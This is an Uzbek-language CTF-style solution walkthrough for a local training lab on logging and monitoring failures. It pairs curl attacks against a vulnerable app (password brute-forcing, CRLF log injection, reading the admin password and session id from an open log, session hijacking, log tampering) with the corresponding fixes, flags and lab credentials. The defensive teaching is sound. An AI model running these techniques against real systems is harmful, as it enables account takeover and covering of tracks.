🌐 [English](./SOLUTION.md) · [Русский](./SOLUTION.ru.md) · **Oʻzbekcha**

# A09 — Yechim tahlili (spoylerlar)

Misollar: `http://127.0.0.1:8081` (vulnerable) va `http://127.0.0.1:8082` (fixed) ga `curl`. Windows'da Git Bash yoki WSL qulayroq (yoki PowerShell'da `curl.exe`).

## 1-nuqson — muvaffaqiyatsiz kirishlar va kirishdan rad etishlar loglanmaydi

`bob` parolini saralaymiz (10 ta notoʻgʻri urinish, soʻng toʻgʻrisi), keyin `alice` sifatida kirib, administrator sahifasini ochib koʻramiz:

```bash
for p in 123456 password qwerty 111111 abc123 letmein admin 12345678 iloveyou monkey bob123; do
  curl -s -o /dev/null -w "$p:%{http_code} " -X POST http://127.0.0.1:8081/login -H 'Content-Type: application/json' -d "{\"username\":\"bob\",\"password\":\"$p\"}"
done
# 123456:401 password:401 ... monkey:401 bob123:200
curl -s -c a.txt -X POST http://127.0.0.1:8081/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
curl -s -b a.txt http://127.0.0.1:8081/admin/export
# {"error": "только для администратора"}   (403)
curl -s http://127.0.0.1:8081/logs
# 2026-10-25T13:49:57 INFO app started
# 2026-10-25T13:49:57 INFO login ok user=admin password=Adm1n-L0g-Pass! sid=d71a9468ca1abd9e
# 2026-10-25T13:49:59 INFO login ok user=bob password=bob123 sid=1489ad9652431036
# 2026-10-25T13:49:59 INFO login ok user=alice password=alice123 sid=1ca24fb70a9940d0
```

Oʻnta muvaffaqiyatsizlik va kirishdan rad etish logda bitta ham qator qoldirmadi. Faqat oxirgi, muvaffaqiyatli urinish koʻrinadi.

**Qoida:** faqat muvaffaqiyatni emas, **muvaffaqiyatsizlik va rad etishlarni** ham loglaymiz: razvedka va saralash aynan ular orqali koʻrinadi.

**Fix:** har bir muvaffaqiyatsiz kirish va har bir kirishdan rad etish jurnalga yoziladi (`# FIX 1`): hodisa, natija (`failure`), foydalanuvchi, IP, vaqt.

## 2-nuqson — log injection

Qayta aloqa shaklidagi xabar logga aynan oʻzi yoziladi. Undagi qator oʻtkazish hech kim yozmagan «yangi yozuv» yaratadi:

```bash
curl -s -X POST http://127.0.0.1:8081/feedback -H 'Content-Type: application/json' \
  -d '{"name":"x","message":"hi\n2026-10-25T03:00:00 INFO login ok user=mallory"}'
curl -s http://127.0.0.1:8081/logs | tail -2
# 2026-10-25T13:49:59 INFO feedback from=x: hi
# 2026-10-25T03:00:00 INFO login ok user=mallory
curl -s http://127.0.0.1:8081/logs/summary
# {"flag": "FLAG{a09_log_forged}", "successful_logins": ["admin","bob","alice","mallory"], ...}
```

Tahlilchi matnni qatorma-qator oʻqiydi va `mallory` foydalanuvchi tizimga kirgan deb hisoblaydi, aslida esa bunday boʻlmagan.

**Qoida:** foydalanuvchidan kelgan hamma narsa logga yozilishdan oldin ishonchsiz hisoblanadi: boshqaruv belgilarini (CR/LF) olib tashlaymiz, uzunlikni cheklaymiz va satrni birlashtirish oʻrniga strukturali (JSON) yozgan afzal.

**Fix:** jurnal yozuvi satr emas, lugʻat; qiymatlar boshqaruv belgilaridan tozalanadi va qisqartiriladi (`clean()`, `# FIX 2`). fixed da xuddi shu urinish `hi 2026-10-25T03:00:00 INFO login ok user=mallory` xabari bor bitta yozuvga aylanadi: soxta «qator» yoʻq.

## 3-nuqson — logda parollar va sessiyalar

Muvaffaqiyatli kirish qatorida parol va sessiya identifikatori yotadi. Logni oʻqishning oʻzi yetarli (5-nuqsonga qarang):

```bash
curl -s http://127.0.0.1:8081/logs | grep 'user=admin'
# 2026-10-25T13:49:57 INFO login ok user=admin password=Adm1n-L0g-Pass! sid=d71a9468ca1abd9e
```

1-variant — topilgan parol bilan kirish:

```bash
curl -s -c adm.txt -X POST http://127.0.0.1:8081/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"Adm1n-L0g-Pass!"}'
curl -s -b adm.txt http://127.0.0.1:8081/admin/export
# {"balances": {...}, "flag": "FLAG{a09_secrets_in_logs}"}
```

2-variant — topilgan sessiyani qoʻyish, parol hatto kerak emas:

```bash
SID=$(curl -s http://127.0.0.1:8081/logs | grep -m1 'user=admin' | sed 's/.*sid=//')
curl -s -b "a09v_sid=$SID" http://127.0.0.1:8081/admin/export
# {"balances": {...}, "flag": "FLAG{a09_secrets_in_logs}"}
```

**Qoida:** loglarga parollar, tokenlar, kalitlar, karta raqamlari va boshqa sirlar tushmaydi. Loglarni koʻpchilik oʻqiydi: dasturchilar, qoʻllab-quvvatlash, loglarni yigʻish tizimlari.

**Fix:** parol umuman loglanmaydi, sessiya identifikatori oʻrniga qisqa izi yoziladi (SHA-256 ning birinchi 8 belgisi): u orqali hodisalarni solishtirish mumkin, ammo kirib boʻlmaydi (`# FIX 3`).

## 4-nuqson — ogohlantirishlar yoʻq

1-nuqsondagi saralashdan keyin:

```bash
curl -s http://127.0.0.1:8081/alerts
# {"alerts": [], "flag": "FLAG{a09_attack_unnoticed}", "note": "за это время было 10 неудачных входов, а оповещений нет — атаку никто не заметил"}
```

Ilova muvaffaqiyatsizliklar keskin oshishiga hech qanday munosabat bildirmaydi, ogohlantirishlar roʻyxati doim boʻsh.

**Qoida:** loglarning oʻzi hech kimni uygʻotmaydi. Qoidalar kerak: vaqt oynasida nechta hodisa tashvish hisoblanadi va tashvish odamga yetib boradigan kanal (pochta, chat, SIEM).

**Fix:** 60 soniyalik oynali hisoblagichlar va chegaralar: bitta IP dan 5 ta muvaffaqiyatsiz kirish → `BRUTE_FORCE`, bitta foydalanuvchida 3 ta kirishdan rad etish → `ACCESS_DENIED_BURST` (`# FIX 4`). Ishga tushgan ogohlantirishning oʻzi jurnalga tushadi. Laboratoriyada ogohlantirishlar `GET /alerts` da koʻrinadi, haqiqiy tizimda ular tashqariga yuboriladi.

## 5-nuqson — log avtorizatsiyasiz ochiq

```bash
curl -s http://127.0.0.1:8081/logs
```

Na cookie, na parol kerak: tarmoqdagi istalgan kishi butun logni oʻqiydi, u bilan birga 2 va 3-nuqsonlar sabab unga tushgan hamma narsani ham.

**Qoida:** log — sezgir maʼlumot: unga kirish faqat roli boʻyicha kerak boʻlganlarda, oʻqish ham jurnalga yoziladi.

**Fix:** `GET /logs`, `/logs/summary`, `/logs/verify` va `/alerts` faqat administratorga ochiq (`# FIX 5`). Qolganlarga — 401/403, har bir rad etish (403) jurnalga tushadi va ogohlantirishlarda hisobga olinadi.

## 6-nuqson — muhim amallar auditi va loglarni almashtirishdan himoya yoʻq

Laboratoriyani tiklaymiz, `bob` sifatida kirib, pul oʻtkazamiz:

```bash
curl -s -X POST http://127.0.0.1:8081/reset-lab
curl -s -c b.txt -X POST http://127.0.0.1:8081/login -H 'Content-Type: application/json' -d '{"username":"bob","password":"bob123"}'
curl -s -b b.txt -X POST http://127.0.0.1:8081/transfer -H 'Content-Type: application/json' -d '{"to":"alice","amount":500}'
# {"balance": 500, "ok": true}
curl -s http://127.0.0.1:8081/logs
# ... login ok user=bob ...   (oʻtkazma haqida bir soʻz ham yoʻq)
```

Kim kimga 500 oʻtkazgani keyin tiklanmaydi. Endi hujumchi oʻz kirishi izlarini oʻchiradi:

```bash
curl -s -X POST http://127.0.0.1:8081/_lab/tamper -H 'Content-Type: application/json' -d '{"index":2,"text":null}'
curl -s http://127.0.0.1:8081/logs
# 2026-10-25T13:50:35 INFO app started
# 2026-10-25T13:50:35 INFO login ok user=admin password=...
```

`bob` kirishi yozilgan qator yoʻqoldi, ilovada buni aniqlay oladigan hech narsa yoʻq.

**Qoida:** muhim amallar (pul, huquqlar, maʼlumotlarni eksport qilish, sozlamalarni oʻzgartirish) audit jurnaliga tushadi: kim, nima, qachon, qayerdan, natija. Jurnal oʻzgartirishdan himoyalangan: append-only saqlash joyi, boshqa mashinadagi nusxa, xesh-zanjir yoki yozuvlar imzosi.

**Fix:** oʻtkazmalar va eksport jurnalga yoziladi (`audit("transfer", ...)`), har bir yozuvda `prev`, yaʼni oldingi yozuv xeshi va oʻzining `hash` i bor (`# FIX 6`). `GET /logs/verify` zanjirni boshidan qayta hisoblaydi.

## fixed ni tekshirish: siz himoyachi rolidasiz

Xuddi shu stsenariy `http://127.0.0.1:8082` da (admin paroli `fixed/app.py` da yotadi):

```bash
# saralash + kirishdan rad etish
for p in 123456 password qwerty 111111 abc123 letmein admin 12345678 iloveyou monkey bob123; do
  curl -s -o /dev/null -X POST http://127.0.0.1:8082/login -H 'Content-Type: application/json' -d "{\"username\":\"bob\",\"password\":\"$p\"}"
done
curl -s -c a.txt -X POST http://127.0.0.1:8082/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
for u in /admin/export /logs /alerts; do curl -s -b a.txt http://127.0.0.1:8082$u; done

# admin sifatida koʻramiz
curl -s -c adm.txt -X POST http://127.0.0.1:8082/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"Adm1n-L0g-Pass!"}'
curl -s -b adm.txt http://127.0.0.1:8082/alerts
# {"alerts": [{"type":"BRUTE_FORCE","count":5,...}, {"type":"ACCESS_DENIED_BURST","key":"alice","count":3,...}]}
curl -s -b adm.txt http://127.0.0.1:8082/logs/verify
# {"entries": 18, "ok": true}

# hujumchi jurnalni tahrirlaydi
curl -s -X POST http://127.0.0.1:8082/_lab/tamper -H 'Content-Type: application/json' -d '{"index":3,"text":"success"}'
curl -s -b adm.txt http://127.0.0.1:8082/logs/verify
# {"first_bad_seq": 4, "note": "журнал изменён: цепочка хешей нарушена", "ok": false}
```

Laboratoriya doirasidan tashqarida nima qoladi: xesh-zanjir «oʻrtadagi» tahrirlash va oʻchirishni tutadi, ammo **oxirgi** yozuvlarning oʻchirilishini va saqlash joyiga toʻliq kirish huquqi bor kishi butun zanjirni qayta hisoblashini tutmaydi. Shuning uchun haqiqiy tizimlarda oxirgi xesh muntazam ravishda alohida serverga yoki SIEM ga yuboriladi. Saralashni bloklash (lockout, rate limit) — A07 mavzusi, bu yerda esa qayd etish va ogohlantirish.

## Xulosa

| № | Nuqson | Qanday koʻrsatilgan | fixed da nima |
|---|--------|---------------------|---------------|
| 1 | Muvaffaqiyatsizlik va rad etishlar loglanmaydi | 10 ta notoʻgʻri kirish va 403 iz qoldirmadi | Har bir muvaffaqiyatsizlik va rad etish jurnalga yoziladi |
| 2 | Log injection | `message` dagi `\n` soxta yozuv yaratadi | Strukturali yozuvlar + boshqaruv belgilarini tozalash |
| 3 | Logda sirlar | Adminning paroli va `sid` i logdan oʻqildi | Sirlar yozilmaydi, sessiya izga almashtirilgan |
| 4 | Ogohlantirishlar yoʻq | 10 ta muvaffaqiyatsiz kirishda `/alerts` boʻsh | Chegaralar va vaqt oynasi, ogohlantirishlar jurnalda |
| 5 | Log ochiq | `GET /logs` avtorizatsiyasiz | Faqat administrator, rad etishlar loglanadi |
| 6 | Audit va yaxlitlik yoʻq | Oʻtkazma loglanmagan, qator sezdirmay oʻchirilgan | Muhim amallar auditi + xesh-zanjir va `/logs/verify` |
